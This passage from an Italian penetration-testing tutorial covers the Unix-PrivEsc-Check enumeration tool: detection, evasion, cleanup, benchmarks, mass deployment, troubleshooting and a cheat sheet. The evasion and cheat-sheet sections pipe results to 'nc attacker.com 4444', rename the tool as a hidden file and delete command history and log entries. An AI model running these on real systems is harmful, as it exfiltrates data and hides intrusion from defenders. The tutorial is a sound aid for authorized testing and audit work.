Feb 05 15:30:46 dmz-server sudo: admin : TTY=pts/1 ; PWD=/tmp ; COMMAND=/usr/sbin/dtappgather
```

**File access monitoring:**

```bash
# AIX audit subsystem
audit query
# Monitoring: /etc/passwd (read), /etc/shadow (read)

# Unix-PrivEsc-Check triggera:
# - Multiple /etc/passwd reads
# - Attempted /etc/shadow read
# - Rapid stat() calls su SUID binaries
```

***

### Tecniche di evasion

**1. Execution con nice/ionice (lower priority)**

```bash
# Standard (noisy)
./unix-privesc-check detailed

# Stealth (slower, less CPU spike)
nice -n 19 ionice -c 3 ./unix-privesc-check standard > /dev/null
```

**Pro:** CPU usage passa da 30% spike a 5% sustained. Meno probabilità di triggerare threshold-based detection.

***

**2. Output redirection per zero disk footprint**

```bash
# Standard (leaves file on disk)
./unix-privesc-check standard > /tmp/output.txt

# Stealth (output a remote listener)
./unix-privesc-check standard | nc attacker.com 4444

# Su attacker
nc -lvnp 4444 > upc_output.txt
```

**Pro:** Nessun file su disco = forensic più difficile.
**Contro:** Network connection outbound è anomala.

***

**3. Time-based execution (split in chunks)**

```bash
# Esegui check in finestre temporali separate
./unix-privesc-check standard 2>&1 | head -100 > part1.txt
sleep 3600  # 1 ora delay

./unix-privesc-check standard 2>&1 | tail -100 > part2.txt
```

**Rationale:** SIEM cerca "burst of suspicious activity". Distribuire nel tempo riduce confidence score.

***

**4. Process masquerading**

```bash
# Rinomina script con nome sistema-like
cp unix-privesc-check /tmp/.check_updates

# Execution
/tmp/.check_updates standard

# In ps appare come: .check_updates invece di unix-privesc-check
```

**Pro:** Nome nascosto (inizia con `.`) e sembra script di sistema.

***

### Cleanup post-execution

```bash
# Rimuovi script
rm -f /tmp/unix-privesc-check /tmp/upc

# Rimuovi output files
rm -f /tmp/*.txt /tmp/audit_*.txt

# Clear command history (se hai shell interattiva)
history -c
rm ~/.bash_history
ln -s /dev/null ~/.bash_history

# Log sanitization (SOLO SE HAI ROOT)
# Rimuovi entry che menzionano unix-privesc-check
sed -i '/unix-privesc-check/d' /var/log/messages
sed -i '/privesc/d' /var/adm/sulog
```

⚠️ **WARNING ETICO:** Log modification è **illegale** senza autorizzazione. In pentest:

* Documenta ogni azione nel report
* Non modificare log senza permesso scritto nel SOW
* Cleanup deve essere concordato con cliente prima dell'engagement

**Timeline cleanup:** 2 minuti

***

## 9️⃣ Performance & Scaling

### Benchmark: Standard vs Detailed

Test su diversi sistemi:

| **System**                       | **Mode** | **Execution Time** | **CPU Peak** | **I/O Wait** |
| -------------------------------- | -------- | ------------------ | ------------ | ------------ |
| Modern Linux (Ubuntu 22.04, SSD) | Standard | 32s                | 15%          | Low          |
| Modern Linux (Ubuntu 22.04, SSD) | Detailed | 4m 15s             | 22%          | Medium       |
| Solaris 10 (SPARC, HDD)          | Standard | 1m 48s             | 25%          | High         |
| Solaris 10 (SPARC, HDD)          | Detailed | 12m 30s            | 30%          | Very High    |
| AIX 7.1 (POWER, SAN)             | Standard | 55s                | 18%          | Medium       |
| HP-UX 11i (Itanium, local disk)  | Standard | 2m 15s             | 35%          | High         |

**Observation:** Legacy Unix systems su hardware old sono **significativamente più lenti**. Detailed mode può richiedere 10+ minuti.

***

### Multi-system deployment strategies

**Scenario:** Audit su 100 server Unix misti (Linux, Solaris, AIX, BSD).

**Approccio 1: GNU Parallel (simple, no dependencies)**

```bash
#!/bin/bash
# parallel_audit.sh

parallel -j 20 --timeout 600 \
  'ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 {}  "cat > /tmp/upc && chmod +x /tmp/upc && /tmp/upc standard" < unix-privesc-check > results/upc_{}.txt 2>&1' \
  :::: servers.txt

echo "[*] Audit completed. Results in results/"
```

```bash
# Execution
./parallel_audit.sh

# Timeline: ~10 minuti per 100 server (20 concurrent)
```

***

**Approccio 2: Ansible (enterprise automation)**

```yaml
---
- name: Unix Security Audit
  hosts: all_unix
  gather_facts: no
  vars:
    upc_script: /tmp/unix-privesc-check
  tasks:
    - name: Check Perl availability
      raw: which perl
      register: perl_check
      ignore_errors: yes
      
    - name: Transfer script
      copy:
        src: ./unix-privesc-check
        dest: "{{ upc_script }}"
        mode: '0755'
      when: perl_check.rc == 0
      
    - name: Execute audit
      shell: "{{ upc_script }} standard"
      register: audit_result
      async: 600
      poll: 0
      
    - name: Wait for completion
      async_status:
        jid: "{{ audit_result.ansible_job_id }}"
      register: job_result
      until: job_result.finished
      retries: 60
      delay: 10
      
    - name: Fetch results
      fetch:
        src: "{{ upc_script }}.log"
        dest: "./results/{{ inventory_hostname }}_audit.txt"
        flat: yes
      
    - name: Cleanup
      file:
        path: "{{ upc_script }}"
        state: absent
```

```bash
ansible-playbook -i inventory_unix.ini unix_audit.yml

# Timeline: ~8 minuti per 100 server
```

***

### Optimization per extremely slow systems

**Problema:** Solaris 10 su SPARC hardware da 2005. Detailed mode impiega 15+ minuti.

**Solution: Selective execution**

Unix-PrivEsc-Check non ha built-in filtering, ma puoi modificare lo script.

```bash
# Backup original
cp unix-privesc-check unix-privesc-check.bak

# Edit script per disable slow checks
vi unix-privesc-check
# Cerca funzioni tipo:
# sub check_world_writable_files
# Commenta o skip

# Oppure wrapper che killlla dopo timeout
timeout 300s ./unix-privesc-check detailed
# Termina dopo 5 minuti max
```

**Alternativa:** Run only specific check functions chiamandole direttamente (requires perl knowledge).

***

## 10️⃣ Tabelle Tecniche

### Command Reference

| **Comando**                                      | **Funzione**                 | **Use Case**                  |
| ------------------------------------------------ | ---------------------------- | ----------------------------- |
| `./unix-privesc-check standard`                  | Quick enumeration (30-60s)   | Initial triage, CTF           |
| `./unix-privesc-check detailed`                  | Complete audit (3-10min)     | Full pentest, compliance      |
| `./unix-privesc-check standard \| tee out.txt`   | Save output + display        | Interactive analysis          |
| `./unix-privesc-check detailed > audit.txt 2>&1` | Full output to file          | Offline analysis, reporting   |
| `grep "WARNING" output.txt`                      | Extract vulnerabilities only | Quick vulnerability list      |
| `nice -n 19 ./unix-privesc-check standard`       | Low priority execution       | Stealth, reduce CPU spike     |
| `timeout 300s ./unix-privesc-check detailed`     | Limit execution time         | Prevent hangs on slow systems |

***

### Comparison Matrix: Unix-PrivEsc-Check vs Modern Tools

| **Feature**               | **Unix-PrivEsc-Check**  | **LinPEAS**   | **LinEnum**      | **LSE**            |
| ------------------------- | ----------------------- | ------------- | ---------------- | ------------------ |
| **Language**              | Perl                    | Bash          | Bash             | Bash               |
| **Solaris support**       | ✅ Full                  | ❌ No          | ❌ No             | ❌ No               |
| **AIX support**           | ✅ Full                  | ❌ No          | ❌ No             | ❌ No               |
| **HP-UX support**         | ⚠️ Partial              | ❌ No          | ❌ No             | ❌ No               |
| **BSD support**           | ⚠️ Limited              | ❌ No          | ❌ No             | ❌ No               |
| **Modern Linux**          | ✅ Works                 | ✅ Best        | ✅ Best           | ✅ Best             |
| **Execution speed**       | 🐌 Slow (Perl overhead) | ⚡ Fast        | ⚡ Fast           | ⚡ Fast             |
| **Output format**         | 📄 Professional report  | 🎨 Colorful   | 📊 Raw data      | 🎯 Severity sorted |
| **CVE auto-detection**    | ⚠️ Limited              | ✅ Excellent   | ❌ No             | ⚠️ Basic           |
| **Report generation**     | ✅ Client-ready          | ⚠️ Informal   | ❌ Technical only | ⚠️ Technical       |
| **Legacy system support** | ✅ Best in class         | ❌ Modern only | ❌ Modern only    | ❌ Modern only      |
| **Learning curve**        | 🟡 Medium               | 🟢 Easy       | 🟢 Easy          | 🟢 Easy            |
| **False positive rate**   | 🟢 Low                  | 🟡 Medium     | 🟢 Low           | 🟢 Low             |

**Decision guide:**

Choose **Unix-PrivEsc-Check** when:
✅ Sistema Unix proprietario (Solaris/AIX/HP-UX)
✅ Bash non disponibile o versione antica
✅ Enterprise audit con report formale richiesto
✅ Compatibilità cross-platform è critica
✅ Hai tempo (slow execution OK)

**Avoid Unix-PrivEsc-Check when:**
❌ Sistema Linux moderno (usa LinPEAS/LSE invece)
❌ Need fast execution (LinPEAS 3x faster)
❌ Want automated CVE scoring (LinPEAS better)
❌ CTF time-limited (troppo lento)

***

### Output Section Guide

Unix-PrivEsc-Check organizza output in sezioni. Questa tabella mostra cosa cercare:

| **Section**            | **Focus On**                | **Exploitation Path**           |
| ---------------------- | --------------------------- | ------------------------------- |
| **System Information** | Kernel version, OS type     | CVE lookup per kernel           |
| **Sudo Configuration** | NOPASSWD, unusual commands  | GTFOBins sudo abuse             |
| **SUID Binaries**      | Uncommon/custom binaries    | Path hijacking, buffer overflow |
| **File Permissions**   | World-writable in /etc /opt | Config tampering, cron abuse    |
| **Cron Jobs**          | Jobs running as root        | Script modification             |
| **NFS Configuration**  | no\_root\_squash exports    | Remote mount exploitation       |
| **Kernel Modules**     | Unsigned modules            | Kernel rootkit loading          |
| **User Accounts**      | Accounts without password   | Direct su to account            |

***

## 11️⃣ Troubleshooting

### "perl: command not found"

**Causa:** Perl non installato (rarissimo su Unix, ma possibile su container minimali).

**Fix:**

```bash
# Verifica se perl in path non-standard
find / -name perl 2>/dev/null
# /usr/local/bin/perl

# Usa path completo
/usr/local/bin/perl unix-privesc-check standard

# Se proprio non c'è perl
# Usa alternative: LinEnum (se hai bash) o manual enumeration
```

***

### Script hangs indefinitely (no output)

**Causa 1:** Filesystem NFS slow o unreachable. Unix-PrivEsc-Check fa stat() su file, NFS timeout causa hang.

**Fix:**

```bash
# Identifica NFS mounts
mount | grep nfs
# /mnt/shared on nfs-server:/export type nfs (rw)

# Kill processo e usa timeout wrapper
timeout 300s ./unix-privesc-check standard
# Termina dopo 5 minuti se hang
```

**Causa 2:** Sistema estremamente lento (vecchio SPARC hardware).

```bash
# Background execution con progress monitoring
./unix-privesc-check standard > /tmp/upc.txt 2>&1 &
PID=$!

# Monitor se processo è alive
while kill -0 $PID 2>/dev/null; do
    echo "[*] Still running... ($(date))"
    sleep 30
done

cat /tmp/upc.txt
```

***

### "Permission denied" on many checks

**Normale!** Unix-PrivEsc-Check tenta leggere file sensibili (`/etc/shadow`, `/root/*`) che richiedono root. Gli errori sono expected.

**Focus sui `[!] WARNING`** che identifica, non sugli errori.

**Optional: Se hai sudo parziale:**

```bash
# Prova con sudo
sudo ./unix-privesc-check standard

# Unix-PrivEsc-Check con root vede più informazioni
```

***

### Output format broken (weird characters)

**Causa:** Encoding issues o terminal non supporta output Unix-PrivEsc-Check.

**Fix:**

```bash
# Redirect a file pulito
./unix-privesc-check standard 2>&1 | cat > clean_output.txt

# Oppure strip caratteri non-ASCII
./unix-privesc-check standard 2>&1 | tr -cd '\11\12\15\40-\176' > clean.txt
```

***

### "Can't locate module" Perl error

**Causa:** Unix-PrivEsc-Check non usa moduli esterni, quindi questo errore è raro. Probabilmente hai modificato lo script o c'è corruzione.

**Fix:**

```bash
# Re-download fresh copy
wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check

# Verifica integrità
head -1 unix-privesc-check
# #!/usr/bin/perl

# Se header corretto, problema è altro (perl installation corrupted?)
perl -v  # Verifica perl funziona
```

***

## 12️⃣ FAQ

**Q: Unix-PrivEsc-Check funziona su macOS?**

A: Parzialmente. macOS è basato su BSD, non Linux. Molti check funzionano (SUID, sudo, file permissions) ma alcuni sono Linux-specific (capabilities, cgroups). Per macOS, considera tool specifici come [MacSploit](https://hackita.it/articoli/macos-privilege-escalation) oppure esegui Unix-PrivEsc-Check e ignora errori BSD-incompatibili.

***

**Q: Perché Unix-PrivEsc-Check è così lento rispetto a LinPEAS?**

A: Due motivi: (1) **Perl ha overhead maggiore di Bash** per I/O operations, (2) **Compatibilità = compromessi performance**. Unix-PrivEsc-Check usa comandi Unix portabili invece di Linux-specific optimizations. È slow by design per garantire compatibilità. Se hai Linux moderno, usa LinPEAS. Se hai Solaris/AIX, Unix-PrivEsc-Check è unica option.

***

**Q: Posso modificare Unix-PrivEsc-Check per aggiungere check custom?**

A: Sì, è Perl script open source. Richiede conoscenza Perl ma è possibile. Esempio: aggiungere check per software proprietario aziendale. Backup original prima di modificare. Community pentestmonkey non accetta custom additions (mantengono focus su checks universali).

***

**Q: Unix-PrivEsc-Check genera troppo output. Come filtro solo vulnerabilità?**

A:

```bash
# Estrai solo WARNING
./unix-privesc-check standard | grep "^\[!\] WARNING"

# Oppure save tutto e analizza dopo
./unix-privesc-check standard > full.txt
grep "WARNING" full.txt > vulnerabilities_only.txt
```

Per report cliente, grep WARNING lines + contesto 5 righe:

```bash
grep -A5 "WARNING" full.txt > client_report.txt
```

***

**Q: È legale usare Unix-PrivEsc-Check su server aziendali?**

A: **Solo con autorizzazione scritta.** Come tutti i pentest tools, uso non autorizzato è illegale (Computer Fraud and Abuse Act USA, Computer Misuse Act UK, leggi equivalenti worldwide). Devi avere:

* Contratto pentest firmato
* Scope chiaro (quali sistemi testabili)
* Rules of Engagement
  Anche se lavori per l'azienda, chiedi permesso al security team prima di eseguire security audit tools.

***

**Q: Unix-PrivEsc-Check è mantenuto attivamente?**

A: No, è "mature software" (stable, feature-complete). Ultimi update significativi nel 2015-2016. Non abbandonato, semplicemente completo per il suo scope. Per sistemi Unix legacy non serve update frequente (kernel/software non cambiano spesso). Per Linux moderno usa tool con active development (LinPEAS, LSE).

***

**Q: Posso eseguire Unix-PrivEsc-Check su embedded devices (router, firewall)?**

A: Sì, SE hanno Perl. Molti embedded device hanno Perl per script di management. Verifica con `which perl`. Se presente, Unix-PrivEsc-Check funziona. Attento a:

* Storage limitato (Unix-PrivEsc-Check 48KB, di solito OK)
* RAM limitata (Perl usa \~20MB, potrebbe essere problema su device \<64MB RAM)
* CPU slow (execution time 5-10x più lungo)

***

## 13️⃣ Cheat Sheet Finale

| **Scenario**                        | **Comando Unix-PrivEsc-Check**                                          |
| ----------------------------------- | ----------------------------------------------------------------------- |
| **Quick enumeration (Solaris/AIX)** | `./unix-privesc-check standard`                                         |
| **Full audit (compliance report)**  | `./unix-privesc-check detailed > audit_$(hostname)_$(date +%Y%m%d).txt` |
| **Extract vulnerabilities only**    | `./unix-privesc-check standard \| grep "WARNING"`                       |
| **Stealth low-priority**            | `nice -n 19 ./unix-privesc-check standard`                              |
| **Timeout per slow systems**        | `timeout 300s ./unix-privesc-check detailed`                            |
| **Output a remote listener**        | `./unix-privesc-check standard \| nc attacker.com 4444`                 |
| **Background execution**            | `nohup ./unix-privesc-check detailed > upc.log 2>&1 &`                  |
| **Multi-host batch (parallel)**     | `parallel ssh {} './unix-privesc-check standard' :::: servers.txt`      |
| **Save with timestamp**             | `./unix-privesc-check standard \| tee upc_$(date +%s).txt`              |
| **HP-UX specific (if supported)**   | `./unix-privesc-check standard 2>/dev/null \| grep -v "not supported"`  |

***

## Disclaimer

Unix-PrivEsc-Check è uno strumento per **penetration testing autorizzato**, **security audit**, e **ricerca in sicurezza informatica**. L'uso senza autorizzazione esplicita scritta del proprietario del sistema costituisce accesso non autorizzato ed è illegale in tutte le giurisdizioni.

Utilizza Unix-PrivEsc-Check esclusivamente in:

* Ambienti di laboratorio controllati (VM, sandbox, test environments)
* Sistemi di tua proprietà
* Engagement di penetration testing con contratto firmato, scope definito, e Rules of Engagement concordati

L'autore di questo articolo e HackIta declinano ogni responsabilità per usi impropri, illegali, o danni causati dall'uso di questo tool o tecniche descritte.

**Repository ufficiale:** [https://github.com/pentestmonkey/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)

**Pentestmonkey resources:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
